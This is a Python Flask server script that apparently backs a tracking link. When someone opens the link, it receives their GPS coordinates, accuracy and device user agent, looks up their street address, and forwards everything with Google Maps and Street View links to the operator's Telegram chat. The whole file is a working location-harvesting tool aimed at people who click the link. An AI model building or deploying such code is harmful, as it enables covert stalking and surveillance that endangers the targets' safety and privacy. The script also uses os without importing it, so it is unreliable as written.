from flask import Flask, request, send_file
from flask_cors import CORS
import requests
import datetime

app = Flask(__name__)
CORS(app)

# 🔑 PUT YOUR DETAILS HERE
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

# 📩 Send message to Telegram
def send_telegram(msg):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": CHAT_ID,
        "text": msg
    }
    r = requests.post(url, data=data)
    print("Telegram response:", r.text)

# 🌍 Get address from coordinates
def get_address(lat, lon):
    url = f"https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lon}&format=json"
    headers = {"User-Agent": "my-tracking-bot"}

    try:
        res = requests.get(url, headers=headers)
        if res.status_code == 200:
            data = res.json()
            return data.get("display_name", "Unknown location")
    except:
        pass

    return "Unknown location"

# 🌐 Serve website
@app.route('/')
def home():
    return send_file("index.html")

# 📍 Receive location
@app.route('/location', methods=['POST'])
def location():
    print("🔥 HIT RECEIVED")

    data = request.get_json()
    print("DATA:", data)

    lat = data.get("latitude")
    lon = data.get("longitude")
    accuracy = data.get("accuracy")
    user_agent = data.get("user_agent")

    # 🕒 Time
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # 🌍 Address
    address = get_address(lat, lon)

    # 📩 Message
    message = f"""
🚨 Someone opened your link!

📱 Device:
{user_agent}

🕒 Time: {current_time}

📍 GPS Location:
Latitude: {lat}
Longitude: {lon}
Accuracy: {accuracy} meters

🏠 Address:
{address}

🗺️ Maps:
Google: https://maps.google.com/?q={lat},{lon}
Street View: https://www.google.com/maps/@?api=1&map_action=pano&viewpoint={lat},{lon}
OpenStreetMap: https://www.openstreetmap.org/?mlat={lat}&mlon={lon}
"""

    send_telegram(message)

    return {"status": "success"}

# 🚀 Run server
if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000)